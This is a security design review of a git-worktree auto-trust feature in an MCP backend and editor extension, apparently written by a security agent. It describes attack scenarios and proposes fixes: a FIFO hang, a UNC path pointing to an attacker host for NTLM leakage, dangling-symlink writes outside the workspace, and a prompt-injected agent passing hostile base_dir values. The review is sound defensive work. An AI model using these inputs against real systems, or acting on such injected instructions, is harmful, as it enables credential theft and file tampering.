# Security Design Review - Addendum 5 (Batch 1/2)
## SA4E-393: Auto-trust git worktree for `base_dir`

| Field | Value |
|-------|-------|
| **Jira Ticket** | SA4E-393 (scope extension, Addendum 5) |
| **Author** | security-agent |
| **Version** | 1.0 |
| **Date** | 2026-11-13 |
| **Phase** | 3.7 (design review only; TDD and code NOT modified) |
| **Status** | **APPROVED-WITH-CONDITIONS** |

---

## 1. Scope and method

Reviewed (static, design level): TDD Addendum 5 (E1-E10), FSD Addendum 5 (A5.x), diagrams `sequence-worktree-trust` / `component-worktree-trust` (as referenced by TDD), and current code `extension/src/services/base-dir-resolution.ts`, `backend/src/shared/multi-worktree-path-resolver.ts`, `backend/src/shared/workspace-allowlist.ts`, `extension/src/mcp-config-builder.ts`.

Not verified: no code of `worktree-trust/` exists yet (batch 2); no dynamic testing; behavior of git versions and Windows filesystems was reasoned from documented behavior, not executed. Diagram PNGs were not opened; the TDD text was treated as authoritative.

Trust anchor assessment: the core design is sound. Trust is derived only from evidence inside a trusted repository (`<trusted>/.git/worktrees/<name>/gitdir` must name `<base_dir>/.git`), so an attacker who controls only `base_dir` content cannot forge it. Copied pointers, copied worktrees, cross-repo `commondir`, submodules and a plain `.git` directory are all rejected (TDD E5 rows 1-5, 19; I agree with each). The findings below are residual weaknesses around that core.

## 2. Findings summary

| ID | Severity | Title | TDD status |
|----|----------|-------|------------|
| SEC-WT-1 | High | Blocking `open()` on FIFO/device and hostile pointer targets can hang the backend (sync fs, budget not preemptive) | Needs TDD fix |
| SEC-WT-2 | High | UNC `realpath` (NTLM leak/hang) before the new guard; OI-WT2 introduces it into the extension | Needs TDD fix (OI-WT8 escalated) |
| SEC-WT-3 | High | `symlinkEscape` fail-open on dangling symlinks; auto-trusted worktrees contain checked-out (attacker-authored) symlinks | Needs TDD fix |
| SEC-WT-4 | Medium | String case-fold equality is not filesystem identity (Unicode fold collisions, trailing dot/space, 8.3) | Partially handled; needs TDD fix |
| SEC-WT-5 | Medium | No bound on WHERE a trusted worktree may live (overlap with `.git`/repo, ancestors, sensitive dirs) | Needs TDD fix |
| SEC-WT-6 | Medium | Cache hit does not re-bind `base_dir` to the verified real path; signature is weak on coarse-mtime FS | Partially handled; needs TDD fix |
| SEC-WT-7 | Medium | Kill switch fails open on typos; "env wins" lets env re-enable a disabled setting | Needs TDD fix |
| SEC-WT-8 | Low | Extension resolves allowlist realpaths on every call (UI-thread hang, repeated syscalls) | Needs TDD fix |
| SEC-WT-9 | Low | Cache/log flooding: negative entries evict positives; one `warn` per distinct miss | Partially handled |
| SEC-WT-10 | Low | Message-group oracle (LEGACY vs GENERIC vs PARENT) | Accepted by design; mitigations optional |
| SEC-WT-11 | Low | `MCP_OPEN_WORKSPACE_FOLDERS` / `mcp.json` / workspace-scope setting trust class | Documented (OI-WT10); small hardening |
| SEC-WT-12 | Low | Parity drift residuals (hand-written glue, allowlist adapter semantics) | Mostly handled |
| SEC-WT-13 | Info | Open folder that is itself a linked worktree: siblings rejected; trust-chaining guidance | Functional gap; design guardrail |
| SEC-WT-14 | Info | Stale registered path can be re-created and is trusted again | Accept |
| SEC-WT-15 | Info | WSL/MSYS pointers and 8.3 names cause false negatives only | Accept (fail-closed) |

No Critical findings. Verified-OK items are listed in section 4.

---

## 3. Detailed findings

### SEC-WT-1 (High): Blocking open of non-regular files and attacker-chosen pointer targets hangs the event loop

**Description.** `readBounded` (E4.3) is `openSync` -> `fstat` -> compare with the `lstat` signature. For `.git` the `lstat().isFile()` check precedes the open, so a FIFO `.git` is safe. For `<admin>/commondir` and `<admin>/gitdir` (E4.2 steps 3-4) the pseudocode passes `...` instead of an lstat signature, and the order is: read `commondir` BEFORE the `commondir_mismatch` check. `openSync(fifo, 'r')` on POSIX blocks until a writer appears; the 250 ms budget is only checked between steps (TDD E3.1 admits this). Because the admin path is taken from the attacker-controlled `.git` pointer and only has to be a directory whose parent is named `worktrees` (step 2), the attacker supplies the whole admin tree.

**Attack scenario.** Attacker-controlled base_dir `B` (e.g. an unpacked archive or a shared mount) contains `B/.git` = `gitdir: /tmp/evil/worktrees/x`. `/tmp/evil/worktrees/x/commondir` is a FIFO (`mkfifo`). The tool call `base_dir=B` reaches `stepCommon`, `openSync` blocks forever, the single-threaded backend (and every other MCP client) is frozen. Same primitive with a pointer into a hung NFS/SMB-mapped path: `realpath`/`lstat` blocks, budget cannot interrupt. Devices (`/dev/zero`, `/dev/tty`) are bounded only if `fstat` happens before read, but `open` on some devices also blocks.

**Recommendation (TDD).**
1. `readBounded` MUST `lstat` first and require `isFile()` and `size <= maxBytes` before any `open`, for EVERY evidence file (not only `.git`); open with `O_RDONLY | O_NONBLOCK | O_NOFOLLOW` (POSIX; `O_NOFOLLOW` is undefined on win32, keep the lstat check there), then `fstat` dev/ino against the lstat result.
2. **Trusted-first ordering (strongly recommended, closes the whole class):** compute the candidate trusted common dirs first (`realpath` of allowlist entries and open folders, each + `.git` or bare itself). Before ANY fs call on the pointer target, lexically normalise the pointer (relative against the dir of `.git`) and require `dirname(pointer)` to equal `<candidate>/.git/worktrees` or `<bare>/worktrees` (fold-compare, also against the non-realpath spelling of the candidate). Reject otherwise (`parent_not_trusted` or `submodule_or_unknown_layout`). After this, every remaining syscall touches either `base_dir` itself or files inside a repository the user already trusts; attacker-chosen network paths, FIFOs and forged admin dirs become unreachable. Keep the existing realpath/back-link/commondir checks as defence in depth. False negative cost: worktree registered through a differently spelled path; document and fall back to `git worktree repair`.
3. Test additions: FIFO as `commondir`/`gitdir` (POSIX, with a hard test timeout), pointer to a path outside any trusted repo asserts zero fs calls on it (spy `FsLike`), extend WT-UT-16.

**Status:** Needs TDD fix. TDD E5 rows 11 and 15 cover only `.git` and size.

---

### SEC-WT-2 (High): UNC realpath before the guard; OI-WT2 spreads it to the extension

**Description.** OI-WT8 (pre-existing) is rated Medium and left unchanged. Current code: `WorkspaceAllowlist.contains()` calls `fs.realpathSync` on an unlisted `base_dir` (verified in `workspace-allowlist.ts`), before the new `precheck`. On Windows, `realpathSync('\\\\attacker\\share\\x')` opens an SMB connection and can leak the NTLM hash and hang. The extension's `isRootAllowlisted` today has NO realpath (verified in `base-dir-resolution.ts`); OI-WT2 deliberately ADDS `realpath(candidate)` there. That introduces a new NTLM-leak/hang vector on the user's desktop extension host from an LLM-controlled argument. The same applies to the per-call `realpath` of allowlist entries (SEC-WT-8).

**Attack scenario.** Prompt-injected agent calls a file tool with `base_dir="\\\\10.0.0.5\\x"` (or `//host/x`, `\\\\?\\UNC\\host\\x`, `\\\\.\\...`). Backend: SMB auth attempt to the attacker's host, 20+ s hang on a sync call. Extension (after OI-WT2): same, on the extension host UI-adjacent thread.

**Recommendation (TDD).** Fix in this scope, not as a follow-up:
- Add `isUncOrDevice(path)` (already designed in `worktree-path-fold.ts`) and call it in BOTH resolvers on the normalised `base_dir` BEFORE `allowlist.contains` / `isRootAllowlisted` and before any `realpath`. On match return the LEGACY rejection message (byte-identical, so no new oracle). Exception: if the raw spelling is a literal allowlist hit (Set lookup, no fs), keep accepting it.
- Apply the same guard to `file_path` absolute passthrough only if it reaches `symlinkEscape` realpath (it does: `existsSync`/`realpathSync` on the resolved path); at minimum for `base_dir`.
- Test: spy `FsLike`/`fs.realpathSync` asserts zero calls for UNC/device/`//host` on both surfaces.

**Status:** Needs TDD fix; raise OI-WT8 from Medium to High and move it into scope.

---

### SEC-WT-3 (High): `symlinkEscape` fails open on dangling symlinks; accepted worktrees hold repo-authored symlinks

**Description.** BR-07 containment relies on `symlinkEscape` (existing, `multi-worktree-path-resolver.ts`). It walks up with `fs.existsSync(cursor)`, which returns false for a dangling symlink (it follows the link), so the walk moves to the parent, `realpath(parent)` is inside the root, and the check passes. A write then follows the dangling link and creates the target. It also returns `null` (allow) on any exception ("best-effort"). Before Addendum 5 this applied only to roots an administrator listed; now any worktree of the open repository is a root, and its content is whatever a remote branch contains. Git can commit symlinks (not `.git` entries), so a checked-out branch from an untrusted remote can carry `link -> /home/user/.ssh/authorized_keys` where the target does not exist yet. The TDD (E5 row 13, TOCTOU (b)) states the existing T3 check is "unchanged" and sufficient; that holds only for existing targets.

**Attack scenario.** User creates a worktree of a PR branch authored by an attacker. The branch contains `notes -> /home/user/.config/autostart/x.desktop` (absent). Prompt injection makes the agent call a write tool with `base_dir=<worktree>`, `file_path="notes"`. Containment string check passes, `existsSync` false, parent real path inside, write creates a file outside the workspace with attacker content.

**Recommendation (TDD).** Because the feature raises exposure, tighten the shared function in the same batch:
- Replace `existsSync` by `lstatSync`: if the cursor is a symlink, `readlink` + resolve (relative to its dir) and re-run containment on the target, even when dangling; reject if outside. Loop with a depth limit (e.g. 40) to prevent link cycles.
- On exceptions other than ENOENT/ENOTDIR return an escape (fail-closed), not `null`.
- Mirror in the extension `fs-guards.ts` path (same behavior; the guard is keyed on `rootSource === "workspace"`, and the TDD keeps that value for worktree trust, which is correct and must be pinned by a test).
- Tests: dangling symlink target outside (write and read), symlink chain, symlinked ancestor, on a worktree root; run on both surfaces via the shared scenario matrix.

**Status:** Needs TDD fix (new scenario `danglingSymlinkOutside`; widen E2.3 to touch `symlinkEscape`).

---

### SEC-WT-4 (Medium): String fold equality is not file identity

**Description.** `samePath` = `foldKey(strip(a)) === foldKey(strip(b))` with `toLowerCase()` on win32. (a) JS `toLowerCase` and the NTFS up-case table differ (e.g. U+212A KELVIN SIGN lower-cases to `k`); two distinct directories can fold-collide. (b) Node's JS `realpathSync` does not normalise trailing dots/spaces or 8.3 names; `precheck` rejects ADS and reserved names but not trailing `.`/` ` components, which Win32 strips when opening. (c) On case-insensitive POSIX volumes (default APFS) `foldKey` is identity.

**Attack scenario.** Attacker (can create a sibling directory next to a legitimate worktree `...\\kit` and copy its `.git` file) creates `...\\\u212At` style look-alike whose folded path equals the back-link target. The back-link string check passes, so the copied worktree gets trusted. Cost is high (needs write next to the real worktree and a fold collision) but the check is meant to be the trust anchor.

**Recommendation (TDD).** Keep the string compare as a fast negative, and ADD an identity check: `lstat(<base>/.git)` and `stat(<backlink target>)` must have equal `dev` and `ino` (bigint; works for NTFS file IDs on Node >= 12). Reject on Windows any path component ending in `.` or space and components matching `~\\d+` (8.3) in `base_dir` and pointers (precheck). Add test `copiedWorktreeFoldCollision` (win32) and a hardlink-copy case (same inode, different path must still fail the string check).

**Status:** Partially handled (E5 rows 17-18, fail-closed for 8.3 only); needs TDD fix.

---

### SEC-WT-5 (Medium): No constraint on where a trusted worktree may be

**Description.** Once the parent is trusted, ANY directory registered under `<trusted>/.git/worktrees/*` becomes a root with read/write over its subtree. Registration needs write access to the trusted `.git` (TDD calls that out of scope), but a registered location can legitimately be anywhere, including overlapping areas that turn file tools into code execution: a worktree whose path is inside the common dir (`.git/hooks` reachable), an ancestor of the trusted repo or of `$HOME`, or a drive/filesystem root. The TDD has no overlap rule.

**Attack scenario.** A malicious archive delivered as an "already cloned repo" (ships a `.git` dir) is opened by the user and becomes a trusted open folder. Its forged `.git/worktrees/x/gitdir` names `<some dir>/.git`; this fails unless that file exists and points back (SEC analysis: sound), so the realistic variant is the repo author registering a worktree at a location where the user later runs `git worktree add`/clone, or a registration at `<repo>/.git/modules/...`. Impact rises if the root is a hooks-bearing directory.

**Recommendation (TDD).** After a `trusted:true` verdict add three cheap lexical/realpath checks, rejecting with `parent_not_trusted`/`submodule_or_unknown_layout` (no new message group): (1) `base_dir` MUST NOT be inside the common dir (`.git`) nor equal/contain it (ancestor-or-self of `repoRoot`, common dir, or any allowlist/open-folder root other than `repoRoot` itself); (2) `base_dir` MUST NOT be a filesystem/drive root or equal the user home directory (`os.homedir()`); (3) log at `warn` when the worktree lies outside `dirname(repoRoot)` (informational, not blocking). Tests: registered worktree at `<repo>/.git/x`, at `<repo>/..`, at `/`.

**Status:** Needs TDD fix.

---

### SEC-WT-6 (Medium): Cache hit does not re-bind the string to the verified real path; weak signature

**Description.** On a hit the cache validates `lstat(e.gitPath)` where `gitPath` is built from the REAL path at verification time and `lstat(e.linkPath)`. If, within the TTL, `base_dir` (the string the caller sent) is replaced by a symlink/junction to another directory, the real `.git` is unchanged, so the hit stays valid while `base_dir` now resolves elsewhere. The TDD relies on T3 at use time (it does catch existing targets, but see SEC-WT-3). The signature `dev:ino:size:mtimeNs` can be reproduced for an in-place same-size rewrite plus `utimes` or on FAT/exFAT with 2 s mtime.

**Recommendation (TDD).** On every hit also compare `realpath(baseDir)` with the stored `realBase` (one extra syscall; update the AC-WT13 expectation to 3 metadata calls, 0 content reads). Include `ctime` in the signature where available. Keep positive TTL at 30 s but consider 10 s given the signature caveat. Test: swap `base_dir` for a junction during TTL -> re-verify -> rejected.

**Status:** Partially handled (E5 TOCTOU (c)); needs TDD fix.

---

### SEC-WT-7 (Medium): Feature flag semantics

**Description.** Auto-trust is ON by default (USER-approved) and only `0,false,off,no` disable it. Any other value (`disable`, `of`, `"false "` unless trimmed, empty after typo) leaves trust ON: a security kill switch that fails open on typos. "env wins" means `MCP_WORKTREE_AUTOTRUST=1` re-enables what the user disabled in settings. Setting scope is unspecified: a repo-provided `.vscode/settings.json` can set workspace-scope values.

**Recommendation (TDD).** Effective = `envEnabled && settingEnabled` (either source can disable; neither can override a disable). Env parsing: unset -> on; recognised enable tokens (`1,true,on,yes`) -> on; any other non-empty value -> OFF plus one `warn` naming the variable (fail-closed). Declare `sdlcAgents.workspace.worktreeAutoTrust` with `"scope": "machine"` (or `application`) so a workspace file cannot change it. Config read exceptions -> disabled. Tests: `"disable"`, `"False"`, `" 0 "`, setting false + env 1.

**Status:** Needs TDD fix. Default ON accepted per USER decision, conditional on the above.

---

### SEC-WT-8 (Low): Extension recomputes allowlist realpaths on every call

**Description.** OI-WT2 makes `getExtensionWorkspaceRoots` realpath every entry on each call (it is already called per request). Hung/slow mounts block the extension host repeatedly; `isRootAllowlisted` also realpaths the candidate (see SEC-WT-2).

**Recommendation.** Cache the computed root set keyed by the raw setting/env string (invalidate on `onDidChangeConfiguration`); realpath each entry once, never from the request path except the candidate after the UNC guard.

**Status:** Needs TDD fix (small).

---

### SEC-WT-9 (Low): Cache and log flooding

**Description.** 256-entry FIFO is shared by positive and negative entries, so a caller issuing 256 distinct bogus `base_dir` values evicts legitimate positive entries (performance degradation only, each re-verification is ~12 syscalls, bounded by 250 ms). Every miss logs at `warn`; distinct paths bypass the 5 s negative TTL and can fill logs (sanitised, so no forging).

**Recommendation.** Separate buckets: positive 128, negative 64 (or negatives never evict positives). Sample/rate-limit the miss `warn` (e.g. 1 line per reason per 10 s plus a counter). No auth impact.

**Status:** Partially handled (E5 row 16).

---

### SEC-WT-10 (Low): Message-group oracle

**Description.** LEGACY vs GENERIC vs PARENT texts reveal that a `.git` pointer file exists at an arbitrary path and whether it names a valid worktree of an untrusted repo (the TDD accepts the last as required by FSD A5.5). No extra path leaks (verified in E6 design; DEV must test it). BR-11 previously ordered allowlist before existence to avoid an existence oracle; this addendum reintroduces a narrow one for `.git`-bearing dirs. Timing differences (cold verify up to 250 ms vs immediate) add a second channel.

**Recommendation.** Accept. Optionally collapse GENERIC and LEGACY for callers on remote HTTP transport (keep the hint only on stdio/extension), and never include `reason` in client output (already so). Keep reason in server logs only.

**Status:** Accepted by design; tests WT-UT-12/WT-IT-20 must also assert there is no `reason` token in the response.

---

### SEC-WT-11 (Low): `MCP_OPEN_WORKSPACE_FOLDERS`, `mcp.json`, setting scope

**Description.** The env is injected by `mcp-config-builder.ts`, which currently sets `config.env` wholesale (`CODE_INTEL_WORKSPACE`, viewer port, restart) so the builder output replaces any value in the file; fine. Anyone who can edit `.kiro/settings/mcp.json` can already change `command`, so the env adds no new principal (agree with OI-WT10). A listed folder only helps if it is a real repo root with a registered worktree (trustRoot must have a `.git` directory), which limits abuse. The workspace-scope setting concern is covered in SEC-WT-7.

**Recommendation.** Parse with cap 16 (as designed); ignore entries that are filesystem roots or the home dir; require each entry to be an existing directory containing a `.git` directory when used as a parent; document that the value is launcher-controlled. Do not read it from request or `initialize` params (already designed).

**Status:** Handled (OI-WT10) plus small hardening.

---

### SEC-WT-12 (Low): Parity drift residuals

**Description.** The generated mirror plus drift guard plus shared matrix is a good design; residual drift lives in hand-written glue: (1) `isAllowlisted` adapters (backend `WorkspaceAllowlist.contains` includes legacy-mode behavior and realpath fallback; extension mirror is an exact-set check); (2) `foldKey` exists separately in `base-dir-resolution.ts` and in the library; (3) platform-specific scenarios (win32-only IT-18) are skipped on POSIX CI so the win32 parity is untested there; (4) the generator rewrites imports by regex.

**Recommendation.** Make `base-dir-resolution.ts` import `foldKey` from the generated library; add a unit test that both `isAllowlisted` adapters give identical answers for a fixed table (symlinked spelling, case, trailing slash, legacy mode); run the matrix on a Windows CI job at least once per release; generator `--check` also in `npm run build`/CI (not only in a test).

**Status:** Mostly handled; small additions.

---

### SEC-WT-13 (Info): Open folder is itself a linked worktree; trust chaining

When the open folder is a linked worktree W1 (typical for Orca-style tooling), `openFolders = [W1]`, but a sibling worktree W2 has `trustRoot = main repo`, which is not in the list, so W2 is rejected as `parent_not_trusted`. This is fail-closed. If SM later wants to support it, derive it only via the same verifier (`verifyWorktree(W1)` then use its `repoRoot` as an additional trusted parent), never by trusting siblings by directory proximity. Worktree-of-worktree chains are not possible in git (admin dirs belong to the common repo) and the layout check (E4.2 step 2/3) rejects forged ones. Base_dir being a repo whose `.git` is a directory is correctly rejected. Recommend recording this as OI-WT11.

### SEC-WT-14 (Info): Stale registration

An admin entry whose worktree directory was deleted but not pruned keeps naming the old path. Re-creating a directory there with a copied `.git` file passes the back-link check. This is the same location git itself would honor and requires write access to a path the user registered; accept. `git worktree prune` removes it.

### SEC-WT-15 (Info): Format false negatives

Git for Windows writes `C:/path/.git` (forward slashes; `path.resolve` normalises), WSL git writes `/mnt/c/...`, MSYS writes `/c/...`: these fail closed as `admin_missing`/`backlink_*`. 8.3 spellings fail closed. Document in UG.

---

## 4. Verified-OK against the threat model

| Threat | Verdict |
|--------|---------|
| (1) forged `.git` / copied back-link / forged admin+commondir | Blocked. Back-link must name `<base>/.git`; `commondir` must equal `<admin>/../..`; layout `worktrees/<name>` required (E5 rows 1-3). Addition of the commondir check is correct and needed. |
| (2) symlink/junction | `.git` via `lstat`, admin and common via realpath, back-link equality; fail-closed on `base_dir` junction (row 13). Gaps: SEC-WT-3, SEC-WT-4, SEC-WT-6. |
| (4) traversal/UNC/NUL/relative | NUL and control chars rejected, `..` harmless after realpath. UNC pointers rejected before fs; `base_dir` UNC gap is SEC-WT-2. |
| (8) submodule/bare/nested | `.git/modules` rejected, bare needs explicit allowlist, plain subdir `not_a_worktree`, nested repo `.git` dir rejected. |
| No process spawn / ReDoS | Single anchored regex on <= 4 KB; no `child_process`. |
| Containment | BR-07 unchanged, `rootSource` unchanged so extension symlink guard remains applied (pin with test). |

## 5. Assessment of SA deviations and open issues

| Item | Assessment |
|------|------------|
| D-WT1 (message wording, LEGACY text kept byte-identical for `not_a_worktree`) | Acceptable. Keeps backward compatibility; see SEC-WT-10 for oracle note. |
| D-WT2 (deleted dir -> re-verify, rejected; BR-WT11 over `FS_ERROR`) | Acceptable and preferable (fail-closed, no stale grant). |
| D-WT3 (bare layout rule: `dirname(admin)` named `worktrees`, not under `.git/modules`) | Acceptable. Add the `.git`-name heuristic edge (separate-git-dir main repos become "bare" and need allowlist) to UG. |
| D-WT4 (<= 12 metadata calls) | Acceptable; will become 13 with SEC-WT-6 re-bind and fewer with trusted-first ordering. |
| OI-WT7 (main worktree / open folder not auto-trusted) | Agree out of scope. Trusting `base_dir == open folder` is low risk but changes legacy semantics; decide separately. |
| OI-WT8 (UNC realpath) | **Escalate to High and fix in scope** (SEC-WT-2). |
| OI-WT9 (sync fs hang on mapped drive) | Residual acceptable only if SEC-WT-1 item 2 (trusted-first) is adopted; otherwise attacker-chosen pointers reach network paths. Remaining exposure is limited to the user's own allowlist/open folders. |
| OI-WT10 (mcp.json env trust class) | Agree; Low, with SEC-WT-7/11 hardening. |

## 6. Verdict

**APPROVED-WITH-CONDITIONS.** The trust model is correct and no Critical issue was found. Three High findings must be resolved in a TDD amendment (SA) before DEV starts batch 2.

### Conditions

**Gate A: TDD amendment by SA before batch 2 (blocking)**
- C1. SEC-WT-1: lstat-before-open for every evidence file, `O_NONBLOCK`/`O_NOFOLLOW`; adopt trusted-first lexical gate on the pointer before any fs access to it.
- C2. SEC-WT-2: UNC/device guard before `allowlist.contains`/`isRootAllowlisted` and before every `realpath`, both surfaces; OI-WT8 moved in scope; zero-fs-call tests.
- C3. SEC-WT-3: `symlinkEscape` uses `lstat`/`readlink`, fail-closed on errors, cycle limit; extension parity; new scenarios.

**Gate B: implementation requirements for DEV batch 2 (blocking at Phase 5.7 code review)**
- C4. SEC-WT-4: inode identity check in addition to string compare; reject trailing dot/space and 8.3 components on win32.
- C5. SEC-WT-5: overlap and root/home guards after a trusted verdict.
- C6. SEC-WT-6: re-bind `realpath(baseDir)` on cache hit; update AC-WT13 expectation.
- C7. SEC-WT-7: fail-closed flag parsing, disable wins across sources, machine-scoped setting.
- C8. Tests for every High/Medium finding added to the WT-IT/WT-UT matrix (FIFO with timeout, dangling symlink, UNC spy, Kelvin/fold collision, junction swap during TTL, flag typos, registered-inside-`.git`).
- C9. Messages: assert no path other than `<b>` and no reason token in client text (WT-UT-12 / WT-IT-20), logs never contain `repoRoot` above `debug`.

**Gate C: recommended, non-blocking**
- SEC-WT-8, 9, 11, 12 hardening; OI-WT11 for SEC-WT-13; UG notes for SEC-WT-14/15 and the kill switch.

Phase 5.7 (Security Code Review) will re-check C1-C9 against the real implementation. This document does not modify TDD, FSD or code, and nothing was committed.
